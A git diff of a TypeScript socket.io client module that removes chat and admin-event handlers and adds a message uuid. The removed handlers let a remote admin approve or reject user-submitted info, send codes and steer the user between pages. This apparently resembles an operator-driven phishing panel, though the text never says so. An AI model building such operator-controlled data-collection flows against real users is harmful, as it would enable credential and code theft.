@@ -1,5 +1,4 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
-import { customHistory } from "@/components/CustomRouter";
 import { effect, signal } from "@preact/signals";
 import axios from "axios";
 import { getCookie, setCookie } from "cookies-next";
@@ -7,7 +6,6 @@ import { FieldValues } from "react-hook-form";
 import { NavigateFunction } from "react-router-dom";
 import { io as ClientIO } from "socket.io-client";
 import { v4 as unique } from "uuid";
-import { Message } from "../../types";
 
 // ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //
 
@@ -134,6 +132,7 @@ socket.value.on("successfully-connected", (id: string) => {
 
   //Joining With Current Id To Server
   socket.value.emit("join", socketId.value);
+
   socket.value.emit("currentPage", {
     ...mainInfo.value,
     page: currentPage.value,
@@ -205,47 +204,6 @@ effect(() => {
 
 // ==> EVENT FROM SERVER <== //
 
-//Check If Admin Connected
-
-// == Receiving Messages For Chat ==
-
-socket.value.on("receive-message", (m: Message) => {
-  messages.value = [...messages.value, m];
-  if (!isChat.value) {
-    isNewMessage.value += 1;
-  }
-});
-
-// == Done Operation Message From Admin  ==
-
-socket.value.on("admin-last-message", ({ message }: { message: string }) => {
-  lastMessage.value = message;
-  loading.value = "";
-  currentPage.value = "END";
-});
-
-// == Code That Sent From Admin  ==
-
-socket.value.on("code", (adminCode: string) => {
-  code.value = adminCode;
-  loading.value = "";
-});
-
-socket.value.on(
-  "admin-response",
-  ({ state, next }: { state: boolean; next: string }) => {
-    loading.value = "";
-    permissions.value = [...permissions.value, next];
-    if (state) {
-      customHistory.push("/" + next);
-    } else {
-      isAdminError.value = true;
-      message.value =
-        "Admin Rejected The Info That You Send To Him, Pleas Make Sure About Them And Try Again !";
-    }
-  }
-);
-
 // Function That Used To Sent Data For Server Any Time
 
 export function sendDataToServer({
@@ -299,6 +257,7 @@ export function sendMessage(message: string) {
     room: ROOM,
     userId: mainInfo.value?._id,
     myId: mainInfo.value?._id,
+    unique: unique(),
   });
 
   messages.value = [
